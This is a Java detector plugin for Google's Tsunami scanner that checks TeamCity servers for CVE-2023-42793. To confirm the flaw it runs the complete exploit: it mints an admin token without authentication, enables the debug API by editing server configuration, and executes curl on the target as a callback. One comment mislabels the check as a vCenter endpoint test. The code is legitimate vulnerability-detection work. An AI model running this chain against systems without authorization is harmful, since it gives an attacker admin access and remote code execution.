/*
 * Copyright 2023 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202342793;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.delete;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.base.Splitter;
import com.google.common.collect.ImmutableList;
import com.google.common.collect.Iterables;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects exposed TeamCity server endpoints vulnerable to RCE
 * (CVE-2023-42793).
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "TeamCityAuthBypassDetector",
    version = "0.1",
    description = "Detects CVE-2023-42793, RCE via auth bypass.",
    author = "Tsunami Team (tsunami-dev@google.com)",
    bootstrapModule = TeamCityAuthBypassDetectorBootstrapModule.class)
public final class TeamCityAuthBypassDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private static final Pattern AUTH_TOKEN_PATTERN = Pattern.compile("RPC2.*value=\"(.*)\"");
  private static final String USER_TOKEN_API = "app/rest/users/id:1/tokens/RPC2";
  private static final String DEBUG_MODE_ENABLEMENT_API =
      "admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true";
  private static final String SERVER_REFRESH_API =
      "admin/admin.html?item=diagnostics&tab=dataDir&file=config/internal.properties";
  private static final String DEBUG_PROCESS_API = "app/rest/debug/processes?exePath=curl&params=";

  @VisibleForTesting static final String VULNERABILITY_REPORT_TITLE = "TeamCity Auth Bypass RCE";

  @VisibleForTesting
  static final String VULN_DESCRIPTION =
      "The TeamCity server contains a remote code execution vulnerability. A malicious actor with"
          + " network access can retrieve a jwt auth token with admin privilege, and execute"
          + " arbitrary process via server's debug API. CVE-2023-42793 affects all on-prem versions"
          + " of JetBrains TeamCity prior to 2023.05.4.";

  @VisibleForTesting
  static final String RECOMMENDATION =
      "To remediate CVE-2023-42793, please upgrade server version to 2023.05.4.\n"
          + "\n"
          + "Please see"
          + " https://blog.jetbrains.com/teamcity/2023/09/critical-security-issue-affecting-teamcity-on-premises-update-to-2023-05-4-now/"
          + " for the detailed remediation instructions.";

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  TeamCityAuthBypassDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Starting TeamCity Auth Bypass RCE detection.");
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  /** Checks if a {@link NetworkService} has a vCenter upload OVA endpoint that returns 405. */
  private boolean isServiceVulnerable(NetworkService networkService) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String targetUri = rootUrl + USER_TOKEN_API;
    try {
      // This is a blocking call.
      // Delete the existing auth token, it could fail if the token doesn't exist in the first place
      httpClient.send(delete(targetUri).withEmptyHeaders().build());

      // Generate the existing auth token
      HttpResponse response = httpClient.send(post(targetUri).withEmptyHeaders().build());
      if (!response.status().isSuccess() || response.bodyString().isEmpty()) {
        return false;
      }

      Matcher tokenMatcher = AUTH_TOKEN_PATTERN.matcher(response.bodyString().get());
      if (!tokenMatcher.find()) {
        return false;
      }

      String authToken = tokenMatcher.group(1);
      logger.atInfo().log("Successfully retrieved auth token '%s'", authToken);

      // Enable Debug mode
      targetUri = rootUrl + DEBUG_MODE_ENABLEMENT_API;
      response = postRequestWithAuthToken(targetUri, authToken);
      if (!response.status().isSuccess()) {
        return false;
      }

      // Refresh Server
      targetUri = rootUrl + SERVER_REFRESH_API;
      response = postRequestWithAuthToken(targetUri, authToken);
      if (!response.status().isSuccess()) {
        return false;
      }

      Thread.sleep(10000);

      // Code Execution
      return isVulnerableWithCallback(rootUrl, authToken);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    } catch (InterruptedException e) {
      logger.atWarning().withCause(e).log("Failed to wait for TeamCity server refresh.");
      return false;
    }
  }

  private boolean isVulnerableWithCallback(String rootUrl, String authToken) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();
    Payload payload = payloadGenerator.generate(config);
    String callbackUri = Iterables.get(Splitter.on(' ').split(payload.getPayload()), 1);
    String targetUri = rootUrl + DEBUG_PROCESS_API + String.format("http://%s", callbackUri);

    try {
      logger.atInfo().log("Trying to execute TeamCity payload on target '%s'", targetUri);
      HttpResponse response =
          httpClient.send(
              post(targetUri)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader("Authorization", "Bearer " + authToken)
                          .build())
                  .build());

      logger.atInfo().log("TeamCity server response '%s'", response);

      return response.status().isSuccess() && payload.checkIfExecuted(response.bodyBytes());
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
      return false;
    }
  }

  private HttpResponse postRequestWithAuthToken(String targetUri, String authToken)
      throws IOException {
    return httpClient.send(
        post(targetUri)
            .setHeaders(
                HttpHeaders.builder().addHeader("Authorization", "Bearer " + authToken).build())
            .build());
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2023_42793"))
                .setSeverity(Severity.CRITICAL)
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2023-42793"))
                .setTitle(VULNERABILITY_REPORT_TITLE)
                .setDescription(VULN_DESCRIPTION)
                .setRecommendation(RECOMMENDATION))
        .build();
  }
}
